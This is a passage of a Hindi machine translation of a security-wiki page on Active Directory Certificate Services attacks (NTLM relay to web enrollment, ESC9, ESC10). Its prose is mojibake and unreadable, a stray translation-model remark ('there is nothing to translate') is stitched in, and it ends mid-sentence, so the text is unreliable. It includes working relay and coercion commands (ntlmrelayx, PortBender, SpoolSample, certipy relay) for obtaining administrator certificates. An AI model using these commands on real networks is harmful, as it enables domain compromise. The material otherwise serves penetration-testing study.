\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify) рдХрд╛ `cas` рдХрдорд╛рдВрдб **рд╕рдХреНрд╖рдо HTTP AD CS рдЕрдВрддрд░рд╛рдкреГрд╖реНрдареЛрдВ** рдХрд╛ рдкрд░рд┐рдЧрдгрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

Enterprise CAs рдЕрдкрдиреЗ AD рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ `msPKI-Enrollment-Servers` рдкреНрд░реЙрдкрд░реНрдЯреА рдореЗрдВ **CES рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рддреЗ рд╣реИрдВ**ред **Certutil.exe** рдФрд░ **PSPKI** рдЗрди рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдХреЗ рд▓рд┐рд╕реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Since there is no English text provided outside of the markdown and HTML syntax, there is nothing to translate. The content you've provided is an image tag and caption tag with no text. If you provide English text, I can translate it into Hindi for you.
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Certify рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Certipy `Machine` рдпрд╛ `User` рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛, рдпрд╣ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд░рд┐рд▓реЗрдпреЗрдб рдЕрдХрд╛рдЙрдВрдЯ рдирд╛рдо `$` рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред `-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреНрдп рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рд╣рдо рдлрд┐рд░ [PetitPotam](https://github.com/ly4k/PetitPotam) рдЬреИрд╕реА рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ `-template DomainController` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирд╣реАрдВ - ESC9 <a href="#5485" id="5485"></a>

### рд╡реНрдпрд╛рдЦреНрдпрд╛

ESC9 **`msPKI-Enrollment-Flag`** рдорд╛рди **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдлреНрд▓реИрдЧ рдХрд┐рд╕реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдирдпрд╛ `szOID_NTDS_CA_SECURITY_EXT` рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдПрдореНрдмреЗрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред ESC9 рдХреЗрд╡рд▓ рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм `StrongCertificateBindingEnforcement` рдХреЛ `1` (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдХреНрдпреЛрдВрдХрд┐ Kerberos рдпрд╛ Schannel рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ ESC10 рдХреЗ рдмрд┐рдирд╛ рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ тАФ ESC9 рдХреЗ рдмрд┐рдирд╛ тАФ рдХреНрдпреЛрдВрдХрд┐ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╕рдорд╛рди рд╣реЛрдВрдЧреАред

* `StrongCertificateBindingEnforcement` рдХреЛ `2` (рдбрд┐рдлрд╝реЙрд▓реНрдЯ: `1`) рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ `CertificateMappingMethods` рдореЗрдВ `UPN` рдлреНрд▓реИрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИ
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ `msPKI-Enrollment-Flag` рдорд╛рди рдореЗрдВ `CT_FLAG_NO_SECURITY_EXTENSION` рдлреНрд▓реИрдЧ рд╣реЛрддрд╛ рд╣реИ
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд┐рд╕реА рднреА рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг EKU рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ
* рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ A рдкрд░ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛

### рджреБрд░реБрдкрдпреЛрдЧ

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, `John@corp.local` рдХреЗ рдкрд╛рд╕ `Jane@corp.local` рдкрд░ `GenericWrite` рд╣реИ, рдФрд░ рд╣рдо `Administrator@corp.local` рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред `Jane@corp.local` рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ `ESC9` рдореЗрдВ рдирд╛рдорд╛рдВрдХрди рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдЬреЛ `msPKI-Enrollment-Flag` рдорд╛рди рдореЗрдВ `CT_FLAG_NO_SECURITY_EXTENSION` рдлреНрд▓реИрдЧ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред

рдкрд╣рд▓реЗ, рд╣рдо `Jane` рдХрд╛ рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Shadow Credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рд╣рдорд╛рд░реЗ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

рдЕрдЧрд▓рд╛, рд╣рдо `Jane` рдХрд╛ `userPrincipalName` `Administrator` рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо `@corp.local` рднрд╛рдЧ рдХреЛ рдЫреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ рдПрдХ рд╕рдВрдпрдо рдЙрд▓реНрд▓рдВрдШрди рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `Administrator` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ `userPrincipalName` `Administrator@corp.local` рд╣реИ рди рдХрд┐ `Administrator`ред

рдЕрдм, рд╣рдо рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ `ESC9` рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред рд╣рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ `userPrincipalName` `Administrator` рд╣реИ рдФрд░ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдХреЛрдИ "рдСрдмреНрдЬреЗрдХреНрдЯ SID" рдирд╣реАрдВ рд╣реИред

рдлрд┐рд░, рд╣рдо `Jane` рдХрд╛ `userPrincipalName` рдХреБрдЫ рдФрд░ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рдмрджрд▓рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдЙрд╕рдХрд╛ рдореВрд▓ `userPrincipalName` `Jane@corp.local`ред

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

рдЕрдм, рдпрджрд┐ рд╣рдо рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ `Administrator@corp.local` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ NT рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред рдЖрдкрдХреЛ рдЕрдкрдиреА рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ `-domain <domain>` рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдХреЛрдИ рдбреЛрдореЗрди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧреНрд╕ - ESC10

### рд╡реНрдпрд╛рдЦреНрдпрд╛

ESC10 рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рджреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `0x18` (`0x8 | 0x10`), рдкрд╣рд▓реЗ `0x1F`ред

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `1`, рдкрд╣рд▓реЗ `0`ред

**рдорд╛рдорд▓рд╛ 1**

`StrongCertificateBindingEnforcement` рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛

**рдорд╛рдорд▓рд╛ 2**

`CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реИ

### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 1

* `StrongCertificateBindingEnforcement` рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛
* рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ A рдкрд░ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, `John@corp.local` рдХреЗ рдкрд╛рд╕ `Jane@corp.local` рдкрд░ `GenericWrite` рд╣реИ, рдФрд░ рд╣рдо `Administrator@corp.local` рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рдЪрд░рдг рд▓рдЧрднрдЧ ESC9 рдХреЗ рд╕рдорд╛рди рд╣реИрдВ, рд╕рд┐рд╡рд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдкрд╣рд▓реЗ, рд╣рдо `Jane` рдХрд╛ рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Shadow Credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рд╣рдорд╛рд░реЗ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

рдЕрдЧрд▓рд╛, рд╣рдо `Jane` рдХрд╛ `userPrincipalName` `Administrator` рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо `@corp.local` рднрд╛рдЧ рдХреЛ рдЫреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ рдПрдХ рд╕рдВрдпрдо рдЙрд▓реНрд▓рдВрдШрди рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `Administrator` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ `userPrincipalName` `Administrator@corp.local` рд╣реИ рди рдХрд┐ `Administrator`ред

рдЕрдм, рд╣рдо рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ `User` рдЯреЗрдореНрдкрд▓реЗрдЯред рд╣рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ `userPrincipalName` `Administrator` рд╣реИред

рдлрд┐рд░, рд╣рдо `Jane` рдХрд╛ `userPrincipalName` рдХреБрдЫ рдФрд░ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рдкрд╕ рдмрджрд▓рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдЙрд╕рдХрд╛ рдореВрд▓ `userPrincipalName` `Jane@corp.local`ред

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

рдЕрдм, рдпрджрд┐ рд╣рдо рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдореЗрдВ `Administrator@corp.local` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ NT рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред рдЖрдкрдХреЛ рдЕрдкрдиреА рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ `-domain <domain>` рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдХреЛрдИ рдбреЛрдореЗрди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 2

* `CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ рдлреНрд▓реИрдЧ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реИ
* рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ A рдкрд░ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдЦрд╛рддрд╛ B рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рдЬрд┐рд╕рдореЗрдВ `userPrincipalName` рдЧреБрдг рдирд╣реАрдВ рд╣реИ (рдорд╢реАрди рдЦрд╛рддреЗ рдФрд░ рдмрд┐рд▓реНрдЯ-рдЗрди рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ `Administrator`)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, `John@corp.local` рдХреЗ рдкрд╛рд╕ `Jane@corp.local` рдкрд░ `GenericWrite` рд╣реИ, рдФрд░ рд╣рдо рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ `DC$@corp.local` рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдкрд╣рд▓реЗ, рд╣рдо `Jane` рдХрд╛ рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Shadow Credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ (рд╣рдорд╛рд░реЗ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

рдЕрдЧрд▓рд╛, рд╣рдо `Jane` рдХрд╛ `userPrincipalName` `DC$@corp.local` рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддреЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ рдПрдХ рд╕рдВрдпрдо рдЙрд▓реНрд▓рдВрдШрди рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `DC$` рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдореЗрдВ `userPrincipalName` рдирд╣реАрдВ рд╣реИред

рдЕрдм, рд╣рдо рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ `User`
